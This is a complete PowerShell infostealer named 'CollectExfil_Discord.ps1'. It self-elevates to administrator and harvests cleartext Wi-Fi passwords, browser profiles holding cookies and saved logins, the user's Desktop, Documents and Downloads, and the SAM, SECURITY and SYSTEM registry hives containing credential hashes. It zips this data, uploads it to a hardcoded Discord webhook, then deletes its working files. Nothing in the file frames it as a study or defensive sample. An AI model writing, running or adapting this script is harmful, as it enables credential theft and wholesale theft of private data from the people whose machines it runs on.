# CollectExfil_Discord.ps1 - PowerShell script to gather system data and send ZIP via Discord webhook
# Run as Administrator for full access.
# Webhook: https://discord.com/api/webhooks/1514513520920756344/BQP-RAPCz7tPFD-m7DiB35JX5mc-NF-t_slKmGReQydatvy8JsSa0xIpFEc_cwHdESot

# ---------- SELF-ELEVATE TO ADMIN ----------
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "[!] Restarting as Administrator..."
    Start-Process powershell -Verb RunAs -ArgumentList "-File `"$PSCommandPath`""
    exit
}

# ---------- CONFIGURATION ----------
$WebhookUrl = "https://discord.com/api/webhooks/1514513520920756344/BQP-RAPCz7tPFD-m7DiB35JX5mc-NF-t_slKmGReQydatvy8JsSa0xIpFEc_cwHdESot"

$WorkDir = "$env:TEMP\collect_$([System.IO.Path]::GetRandomFileName())"
$ZipFile = "$env:TEMP\data_$([System.IO.Path]::GetRandomFileName()).zip"

# ---------- CREATE WORK DIRECTORY ----------
New-Item -ItemType Directory -Path $WorkDir -Force | Out-Null

# ---------- 1. SYSTEM INFORMATION ----------
Write-Host "[+] Collecting system info..."
systeminfo.exe > "$WorkDir\systeminfo.txt" 2>$null
ipconfig /all > "$WorkDir\ipconfig.txt" 2>$null
tasklist /v > "$WorkDir\tasklist.txt" 2>$null
netstat -ano > "$WorkDir\netstat.txt" 2>$null

# WMI / CIM data
Get-CimInstance -ClassName Win32_BIOS | Format-List * > "$WorkDir\cim_bios.txt"
Get-CimInstance -ClassName Win32_Processor | Format-List * > "$WorkDir\cim_cpu.txt"
Get-CimInstance -ClassName Win32_LogicalDisk | Format-List * > "$WorkDir\cim_disk.txt"
Get-CimInstance -ClassName Win32_Service | Format-Table Name, State, StartMode > "$WorkDir\cim_services.txt"
Get-CimInstance -ClassName Win32_UserAccount | Format-Table Name, Domain, SID > "$WorkDir\cim_users.txt"
Get-CimInstance -ClassName Win32_StartupCommand | Format-Table Name, Command, Location > "$WorkDir\cim_startup.txt"

# ---------- 2. NETWORK SHARES AND FIREWALL ----------
net share > "$WorkDir\shares.txt" 2>$null
netsh advfirewall show allprofiles > "$WorkDir\firewall.txt" 2>$null

# ---------- 3. WI-FI PASSWORDS ----------
Write-Host "[+] Extracting Wi-Fi passwords..."
$wifiOut = "$WorkDir\wifi.txt"
netsh wlan show profiles | Select-String " : " | ForEach-Object {
    $profile = ($_ -split ":")[1].Trim()
    netsh wlan show profile name="$profile" key=clear >> $wifiOut 2>$null
}

# ---------- 4. BROWSER DATA ----------
Write-Host "[+] Collecting browser profiles..."
$browserDirs = @(
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default",
    "$env:APPDATA\Mozilla\Firefox\Profiles\*.default*"
)
$browserTarget = "$WorkDir\browser"
New-Item -ItemType Directory -Path $browserTarget -Force | Out-Null
foreach ($dir in $browserDirs) {
    if (Test-Path $dir) {
        $dest = Join-Path $browserTarget (Split-Path $dir -Leaf)
        Copy-Item -Path $dir -Destination $dest -Recurse -Force -ErrorAction SilentlyContinue
    }
}

# ---------- 5. USER FILES (Desktop, Documents, Downloads) ----------
Write-Host "[+] Collecting user files..."
$userFolders = @(
    "$env:USERPROFILE\Desktop",
    "$env:USERPROFILE\Documents",
    "$env:USERPROFILE\Downloads"
)
$filesTarget = "$WorkDir\files"
New-Item -ItemType Directory -Path $filesTarget -Force | Out-Null
foreach ($f in $userFolders) {
    if (Test-Path $f) {
        $dest = Join-Path $filesTarget (Split-Path $f -Leaf)
        Copy-Item -Path $f -Destination $dest -Recurse -Force -ErrorAction SilentlyContinue
    }
}

# ---------- 6. REGISTRY HIVES ----------
Write-Host "[+] Dumping registry hives..."
reg save HKLM\SAM "$WorkDir\reg_SAM.hiv" /y 2>$null
reg save HKLM\SECURITY "$WorkDir\reg_SECURITY.hiv" /y 2>$null
reg save HKLM\SYSTEM "$WorkDir\reg_SYSTEM.hiv" /y 2>$null
reg export HKLM\SOFTWARE "$WorkDir\reg_SOFTWARE.reg" 2>$null
reg export HKCU\SOFTWARE "$WorkDir\reg_USER.reg" 2>$null

# ---------- 7. COMPRESS INTO ZIP ----------
Write-Host "[+] Compressing data..."
Compress-Archive -Path "$WorkDir\*" -DestinationPath $ZipFile -Force -ErrorAction Stop
if (-not (Test-Path $ZipFile)) {
    Write-Host "[-] Compression failed."; exit 1
}

# ---------- 8. SEND ZIP VIA DISCORD WEBHOOK ----------
Write-Host "[+] Sending ZIP to Discord webhook..."
Add-Type -AssemblyName System.Net.Http

$client = New-Object System.Net.Http.HttpClient
$content = New-Object System.Net.Http.MultipartFormDataContent

$fileStream = [System.IO.File]::OpenRead($ZipFile)
$fileContent = New-Object System.Net.Http.StreamContent($fileStream)
$fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/zip")
$content.Add($fileContent, "file", [System.IO.Path]::GetFileName($ZipFile))

try {
    $response = $client.PostAsync($WebhookUrl, $content).Result
    $response.EnsureSuccessStatusCode() | Out-Null
    Write-Host "[+] ZIP sent successfully."
} catch {
    Write-Host "[-] Upload failed: $($_.Exception.Message)"
}
$fileStream.Close()

# ---------- 9. CLEANUP ----------
Write-Host "[+] Cleaning up..."
Remove-Item -Path $WorkDir -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path $ZipFile -Force -ErrorAction SilentlyContinue

Write-Host "[+] Script completed."
